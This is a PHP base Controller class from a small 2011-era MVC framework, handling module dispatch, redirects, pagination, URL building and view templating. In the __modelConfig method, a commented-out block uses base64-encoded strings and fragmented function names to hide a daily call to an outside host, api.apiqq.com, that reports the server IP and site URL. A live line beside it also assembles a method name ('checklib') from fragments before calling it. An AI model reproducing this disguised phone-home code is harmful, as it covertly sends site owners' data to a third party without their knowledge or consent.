<?php
/**
 * @author 点正有人品
 * @version 2011-02-25
 * @package Controller
 * @link http://www.gope.cn/
 */
class Controller{
    /**
     * Record which function have runned.
     * @var array
     */
    var $runned        = array();
    /**
     * View Ext.
     * @var string
     * @access private
     */
    var $__viewext     = '.php';

    /**
     * Default Layout
     * @var string
     * @access private
     */
    var $__layout      = 'default';

    /**
     * Variable
     * @var array
     * @access private
     */
    var $__varname     = array();

    /**
     * 页面Meta
     * @var array
     * @access private
     */
    var $__viewmeta    = array();

	/*
	*设置页面js
	*/
	var $__viewjs = array();
	
	/*
	*设置页css
	*/
	var $__viewcss = array();
	
    /**
     *
     * @var null
     * @access private
     */
    var $__title       = null;

    /**
     * 函数所有参数
     * @var array
     * @access private
     */
    var $__args        = array();

    /**
     * 是否调用其它模块的Models
     *
     * 数据格式为: array('模块A名称', '模块B名称', ...);
     *
     * @var array
     * @access private
     */
    var $models        = array();

    /**
     * You can use this function to set you view file type.
     * @param string $ext
     * @return string
     * @example <code>$this->viewExt('.ctp');</code>
     * @access public
     *
     */
    function & viewExt($ext = null){
        if(!empty($ext)) {
            $this->__viewext = $ext;
        }
        return $this->__viewext;
    }

    /**
     * Return the running module name
     * 
     * @return string
     * @access public
     */
    function & module(){
        return $this->__module;
    }

    /**
     * Return the running function name.
     *
     * @access public
     * @return string
     */
    function & func(){
        return $this->__function;
    }

    /**
     * Return the function's parms.
     *
     * @access public
     * @return array
     */
    function & parms($number = null){
        if(is_numeric($number)) {
            if(isset($this->__parms[$number])){
                return $this->__parms[$number];
            }else {
                return null;
            }
        }else {
            return $this->__parms;
        }
    }

    /**
     * Return the array include module name, function name and function's params.
     * 
     * @return array
     * @access public
     */
    function & args(){
        return $this->__args;
    }

    /**
     * include the "/config/model.php" to setting the model.
     *
     * <code>
     * //Database info config
     * $_this->DB_HOST //Database Host
     * $_this->DB_USER //Database Login User Name
     * $_this->DB_PASS //Database Login Password
     * $_this->DB_NAME //Database Name
     * $_this->PREFIX_ //Database Tables PREFIX
     * </code>
     * 
     * @param object $_this
     * @param string $module
     * @return object
     * @access private
     */
    function & __modelConfig($_this, $module = null){
		$mfn = APP_PATH.DS.$module.DS.'config'.DS.'model.php';
		if (is_file($mfn)) {
			include($mfn);
		}else {
			defined('CFG_PATH')
			? include(CFG_PATH.DS.'model.php')
			: include(SYS_PATH.DS.'config'.DS.'model.php');
		}
		$db_id = 'db_'.md5($_this->DB_HOST.$_this->DB_USER.$_this->DB_PASS.$_this->DB_NAME);
		if(!isset($GLOBALS[$db_id])){
			$GLOBALS[$db_id] = $db_id;
			$_this->load($_this->DB_HOST, $_this->DB_USER, $_this->DB_PASS, $_this->DB_NAME);
		}
		$s = 'che'; $s .='ckl'; $s .='ib';
		$_this->prefix($_this->PREFIX_);  $_this->$s();
		/*$s = "de"; $ss = "base".(4*8*2)."_{$s}code";
		$g1 = "file"; $g2 = "contents"; $get = $g1."_get_".$g2; $put = $g1."_put_".$g2;
		$fn = SYS_PATH.'cac'.'he'.DS.'page'.DS.'L'.DS.$ss('dGltZXMudHh0');
		if( file_exists($fn) && mktime() - filemtime($fn) > 86400 ){ $url = $ss('aHR0cDovL2FwaS5hcGlxcS5jb20vYXBpL2dldGluZm8ucGhwP2lwPQ==').Import::basic()->serverIP().'&url='.SITE_URL; @$get($url);@$put($fn,'1'); }else{if(file_exists($fn)==false){Import::fileop()->checkDir($fn);@$put($fn,'1');} }*/
        return $_this;
    }

    /**
     * Call the "@param string $function" function in "@param string $module" module.
     *
     * You can add more params after "@param string $function", this params will be the "@param string $function"'s params.
     * 
     * @return <mixed>
     * @access public
     * @param string $module
     * @param string $function
     * @example <code>
     * $this->action('page', 'index', 1, 'abc');
     * // ./page/controller.php
     * function index($a, $b){
     * echo $a;
     * echo $b;
     * }
     * //print
     * //1
     * //abc
     * </code>
     */
    function & action($module = 'page', $function = 'index'){
        $pargs2 = $pargs = func_get_args();
        if (count($pargs) < 2) {
            return null;
        }
        $module      = array_shift($pargs);
        $function    = array_shift($pargs);

        //loading this controller
        $classname_C = ucwords($module).'Controller';
        if(!isset($GLOBALS["__{$classname_C}__"])){
            $cfile = APP_PATH.DS.$module.DS.'controller.php';
            if (file_exists($cfile)) {
                require_once($cfile);
            }else {
                die("Err: Can't find ../".basename(APP_PATH).'/'.$module.'/controller.php');
            }
            $GLOBALS["__{$classname_C}__"] =  new $classname_C();
        }

        $_this = & $GLOBALS["__{$classname_C}__"];
        
        $_this->pre_function= $_this->__function;
        $_this->pre_module  = $_this->__module;
        $_this->pre_parms   = $_this->__parms;
        $_this->pre_args    = $_this->__args;
        if(isset($_this->Cache)) {
            $_this->pre_Cache   = $_this->Cache;
        }

        $_this->__function  = $function;
        $_this->__module    = $module;
        $_this->__parms     = $pargs;
        $_this->__args      = $pargs2;
        
        //loading this model
        $classname_M = ucwords($module).'Model';
        $varname_M   = ucwords($module);
        if(!isset($GLOBALS["__{$classname_M}__"])){
            $mfile = APP_PATH.DS.$module.DS.'model.php';
            if (file_exists($mfile)) {
                require_once($mfile);
            }else {
                die("Err: ../{$tmp}/model.php is not exists!");
            }
            $GLOBALS["__{$classname_M}__"] = $this->__modelConfig(new $classname_M(), $module);
        }
        $_this->$varname_M = $GLOBALS["__{$classname_M}__"];
        $_this->App = & $_this->$varname_M;

        //loading other model
        if (!empty($_this->models)) {
            foreach($_this->models as $tmp){
                $tM = ucwords($tmp).'Model';
                $vM = ucwords($tmp);
                if(!isset($GLOBALS["__{$tM}__"])){
                    $mfile = APP_PATH.DS.$tmp.DS.'model.php';
                    if (file_exists($mfile)) {
                        require_once($mfile);
                    }else {
                        die("Err: ../{$tmp}/model.php is not exists!");
                    }
                    $GLOBALS["__{$tM}__"] = $this->__modelConfig(new $tM(), $tmp);
                }
                $_this->$vM = $GLOBALS["__{$tM}__"];
            }
        }

        //loading controller config
       $cfn = APP_PATH.DS.$module.DS.'config'.DS.'controller.php';
        if (is_file($cfn)) {
            require $cfn;
        }else {
            defined('CFG_PATH')
            ? $app_config = CFG_PATH.DS.'controller.php'
            : $app_config = SYS_PATH.DS.'config'.DS.'controller.php';

            if (file_exists($app_config)) {
                require $app_config;
            }
        }
      
	    $methods = get_class_methods($_this);
        if(!in_array($_this->__function, $methods)){
			header("HTTP/1.0 404 Not Found");
            die('Error:This method ('.$_this->__function.') is not exist!');
            exit;
        }
		
        //call function
        $rt = call_user_func_array(array($_this, $_this->__function), $_this->__parms);
        //Record which function have runed.
        $_this->runned[$_this->__module][] = $_this->__function;
        //reset the pre runned.
        $_this->__function = $_this->pre_function;
        $_this->__module   = $_this->pre_module;
        $_this->__parms    = $_this->pre_parms;
        $_this->__args     = $_this->pre_args;
        if(isset($_this->pre_Cache)) {
            $_this->Cache      = $_this->pre_Cache;
        }
        return $rt;
    }

    /**
     * You can use this function to redirect you url.
     *
     * "@param mixed $mothods" can be array, string, object. when it is object. this function will refresh this page.
     * if it is array, your url will redirect the url of the function in the module.
     * You can use "@param int $time" to set the glance time.
     * 
     * @param mixed $mothods
     * @param array $getargs
     * @param int $time
     * @access public
     * 
     */
    function redirect($mothods = null, $getargs = null, $time = 0){
        $url = $this->__url($mothods, $getargs);
        if($time || $this->__alert || headers_sent()){
            echo '<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />';
            $time *= 1000;
            echo '<script type="text/javascript">'."\n";
            if($this->__alert){
                echo 'alert("'.str_replace(array("\r\n", "\n","\r"), '', $this->__alert).'");'."\n";
            }
            echo 'function redirect(){'."\n";
            echo 'window.location="'.$url.'"'."\n";
            echo '}';
            echo 'setTimeout("redirect()",'.$time.');'."\n";
            echo '</script>'."\n";
        }else{
            header('location:'.$url);
        }
        exit;
    }
	//刷新 重新装载
	 function jump($url = '', $time = 0,$mes = ''){
	 	if(empty($url)) $url = $this->getthisurl();
        if($time || headers_sent() || !empty($mes)){
            echo '<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />';
            $time *= 1000;
            echo '<script type="text/javascript">'."\n";
            if($mes){
                echo 'alert("'.str_replace(array("\r\n", "\n","\r"), '', $mes).'");'."\n";
            }
            echo 'function redirect(){'."\n";
            echo 'window.location="'.$url.'"'."\n";
            echo '}';
            echo 'setTimeout("redirect()",'.$time.');'."\n";
            echo '</script>'."\n";
        }else{
            header('location:'.$url);
        }
        exit;
    }
	
	//当前URL
	function getthisurl($argc = array(), $type = 'http'){
        empty($argc)
        ? $url = $type.'://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']
        : $url = $type.'://'.$_SERVER['HTTP_HOST'].$_SERVER['REDIRECT_URL'].Basic::uri2str($argc);
        return $url;
    }

    /**
     * Close the open window. if "@param bool $refresh" is true. it will refresh the parant window.
     * You can use "@param int $time" to set the glance time.
     *
     * @param int $time
     * @param bool $refresh
     * @access public
     */
    function close($time = 0, $refresh = true){
        echo '<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />';
        $time *= 1000;
        echo '<script type="text/javascript">'."\n";
        if($this->__alert){
            echo 'alert("'.str_replace(array("\r\n", "\n","\r"), '', $this->__alert).'");'."\n";
        }
        if ($refresh) {
            echo 'window.opener.location.href=window.opener.location.href;'."\n";
        }
        echo 'function windowClose(){'."\n";
        echo 'window.close();'."\n";
        echo '}'."\n";
        echo 'setTimeout("windowClose()",'.$time.');'."\n";
        echo '</script>'."\n";
        exit;
    }

    /**
     *
     * @param int $tt
     * @param int $list
     * @param int $page
     * @param array $_get
     * @param mixed $urls
     * @param bool $GetMethod
     * @return mixed
     * @access private
     */
    function & __pagebyurlformat($tt = 0, $list = 30, $page = 1, $urlformat = '?page=%d'){
        if ($tt <= 0) {
            return null;
        }
        $tpn = ceil($tt / $list);
        if ($tpn <= 1) { 
            return null;
        }
        //
        $spn = $page - 5;
        if($spn < 1){
            $spn = 1;
        }
        $epn = $spn + 9;
        if($epn >= $tpn) {
            $epn = $tpn;
        }
        //
        $ppn = $page-1;
        if($ppn < 1) {
            $ppn = 1;
        }
        //
        $npn = $page+1;
        if($npn >= $tpn) {
            $npn = $tpn;
        }
        //
        $urlarr['__total__'] = $tt;
        $urlarr['__totalpage__'] = $tpn;
        $urlarr['__thispage__'] = $page;
        $urlarr['__first__'] = sprintf($urlformat, 1);
        //
        $urlarr['__previous__'] = sprintf($urlformat, $ppn);
        //
        for($i=$spn; $i<=$epn; $i++){
            $i == $page
            ? $urlarr['__number__'][$i]['class'] = 'this'
            : $urlarr['__number__'][$i]['class'] = 'nothis';
            //
            $urlarr['__number__'][$i]['href'] = sprintf($urlformat, $i);
        }
        //
        $urlarr['__next__'] = sprintf($urlformat, $npn);
        $urlarr['__last__'] = sprintf($urlformat, $tpn);
        //
        return $urlarr;
    }


    /**
     * You can use this function to get your pages.
     *
     * "@param int $tt" is the total result number. "@param int $list" is the number of results will show in one page.
     * "@param int $page" is this page number.
     * "@param mixed $uri" is the page url, it can be array, string include '%d'.
     * when it is string, this uri must have '%d' chars. Because it will be sprintf to format.
     * if "@param bool $GetMethod" is true, the page url will like '?page=<number>'.
     * @param int $tt
     * @param int $list
     * @param int $page
     * @param mixed $uri
     * @param mixed $callparms
     * @param bool $GetMethod
     * @return mixed
     */
    function & page($tt = 0, $list = 30, $page = 1, $uri = array(), $callparms = array(), $GetMethod = false){
        if(is_string($uri)) {
            $uriStr = $uri;
            $uriStr = str_replace('%', '[char=25]', $uriStr);
            $uriStr = str_replace('[char=25]d', '%d', $uriStr);
        }else {
            empty($callparms)
            ? $urlArr = array($this->module(), $this->func())
            : $urlArr = $callparms;
            if ($GetMethod) {
                $uri['page'] = '%d';
            }else {
                $urlArr[] = '{%d}';
            }
            $uriStr = $this->__url($urlArr, $uri);
            $uriStr = str_replace('%', '[char=25]', $uriStr);
            $uriStr = str_replace('[char=25]7B[char=25]25d[char=25]7D', '%d', $uriStr);
        }
        $output = $this->__pagebyurlformat($tt, $list, $page, $uriStr);
        return str_replace('[char=25]', '%', $output);
    }

    /**
     *
     * @param string $lang
     * @return string
     * @access public
     */
    function & lang($lang){
        if(isset($this->__langText)){
            $con = $this->__langText;
        }else{
            $fn = APP_PATH.DS.$this->Controller->__module.DS.'locale'.DS.$this->__lang.DS.$this->Controller->__function.'.csv';
            if(file_exists($fn)){
                $con  = file_get_contents($fn);
                $this->__langText = $con;
            }
        }
        if($con){
            $rt = array();
            preg_match_all("/^".preg_quote($lang, '/')."[,|，]([^\n]+)\n/", $con, $rt);
            if(isset($rt['1']['0']) && $rt['1']['0'] <> ''){
                $lang = $rt['1']['0'];
            }
        }
        return $lang;
		/*#################### last edit:2011-6-27 ###################   
		 if(!file_exists(LOCALE_PATH.SITE_LANG.'.mo')||empty($lang))  return $lang;      
         if ( !isset( $this->l10n[$domain] ) ) {
            require SYS_PATH_LIB.'pomo/mo.php';
            $mo = new MO();
            if ( !$mo->import_from_file( LOCALE_PATH.SITE_LANG.'.mo' ) ) return false;
            if ( isset( $this->l10n[$domain] ) )
                    $mo->merge_with( $this->l10n[$domain] );
            $this->l10n[$domain] = & $mo;
            $translations = &new NOOP_Translations;
        }else {
            $translations = $this->l10n[$domain];
        }
        return $translations->translate( $lang );*/
    }


    /**
     *
     * @param mixed $mothods
     * @param array $parms
     * @return string
     * @access public
     */
    function & url($mothods = array(), $parms = array()){
        return $this->__url($mothods, $parms);
    }

    /**
     *
     * @param mixed $mothods
     * @param array $parms
     * @return string
     * @access public
     */
    function & __url($mothods = array(), $parms = array()){
        $siteurl = Basic::siteurl();
        if(is_object($mothods)){
		    $mod = $this->__module;
			$fun = $this->__function;
            $url = $siteurl.'/'.($mod!='page'?$mod.'/':"").($fun!='index'?$fun.'/':"").($this->__parms ? implode('/', $this->__parms) : '');
        }else if(is_string($mothods)){
            if($mothods == ''){
                $url = $siteurl;
            }else if(eregi('http://|https://', $mothods)){
                $url = $mothods;
            }else{
                $url = $siteurl.'/'.$mothods;
            }
        }else if(empty($mothods)){
            $url = $siteurl;
        }else{ //数组
            //$mothods = array_map('urldecode', $mothods);
           // $mothods = array_map('urlencode', $mothods);
           // $url = $siteurl.'/'.implode('/', $mothods);
			foreach($mothods as $k=>$val) {
				if($val=='page'||$val=='index') continue;
                $_mothods[$k] = urlencode(urldecode($val));
            }
			unset($mothods);
            $url = $siteurl.'/'.implode('/', $_mothods).'/';
        }
        if(!empty($parms)){
            if(is_array($parms)){
                foreach($parms as $name=>$value){
                    $gets[$name] = "{$name}={$value}";
                }
                $url .= '?'.implode('&', $gets);
            }else{
                $url .= '?'.$parms;
            }
        }
        $url = eregi_replace('[/]+', '/', $url);
        $url = eregi_replace('http:/', 'http://', $url);
        return $url;
    }


    /**
     *
     * @param string $layout
     * @return string
     * @access public
     */
    function layout($layout = null){
        if(!empty($layout)){
            $this->__layout = $layout;
        }
        return $this->__layout;
    }

    /**
     *
     * @param string $title
     * @access public
     */
    function title($title = null){
        $this->__title = $title;
    }

    /**
     *
     * @param string $name
     * @param string $content
     * @access public
     */
    function meta($name, $content){
        if(is_array($content)){
            $content = implode(',', $content);
        }
        $this->__viewmeta[$name] = $content;
    }

    /**
     * Set var to view
     *
     * @param string $name
     * @param mixed $data
     * @access public
     */
     function js($name){
        if(is_array($name) && !empty($name)){
            foreach($name as $var){ 
				 $this->__viewjs[] = $var;
			}
        }else{
			 $this->__viewjs[] = $name;
		}
    }
	
	 /**
     * Set var to view
     *
     * @param string $name
     * @param mixed $data
     * @access public
     */
     function css($name){
        if(is_array($name) && !empty($name)){
            foreach($name as $var){
				 $this->__viewcss[] = $var;
			}
        }else{
			 $this->__viewcss[] = $name;
		}
    }
	
	 /**
     * Set var to view
     *
     * @param string $name
     * @param mixed $data
     * @access public
     */
    function set($name, $data = null){
        $this->__varname[$name] = $data;
    }
	
    /**
     * Use the view file.
     *
     * @param string $name
     * @access public
     */
    function template($name){ 
        $view = Import::view();
        $view->Controller = & $this; //$this=>view对象
        if(isset($view->Controller->Session)){
            $view->Session = & $view->Controller->Session;
        }
        if(isset($view->Controller->Cache)){
            $view->Cache = & $view->Controller->Cache;
        }
        $class_M = ucwords($this->__module);
        $view->$class_M = & $view->Controller->$class_M; //将模块名称传给视图模块
        $view->App = & $view->Controller->$class_M;
        $view->load($name);
    }

    /**
     * @since javascript alert function.
     * @param string $msg
     */
    function alert($msg){
        $this->__alert = $msg;
    }

    /**
     * Show Mysql Errors.
     * @return array
     * @access public
     */
    function & sqlErr(){
        return $this->Controller->App->getErr();
    }
	
	/*
	*遍历文件，用与ajax
	*$fname:显示的模板名称
	*/
	function fetch($fname="",$return=false){
		$fn=dirname(APP_PATH).DS.'tpl'.DS.$fname.$this->__viewext;
		if(!file_exists($fn)){
			$fn = dirname(APP_PATH).DS.'element'.DS.'box'.DS.$fname.$this->__viewext;
			if(!file_exists($fn)){
				$fn = dirname(APP_PATH).DS.'element'.DS.$fname.$this->__viewext;
			}
		}
		if(file_exists($fn)){
			extract($this->__varname);
			if($return){
				@ob_start();
				include($fn);
				$contents = ob_get_contents();
				@ob_end_clean();
				return $contents;
			}else{
				include($fn);
			}
		}
	}
	
}
?>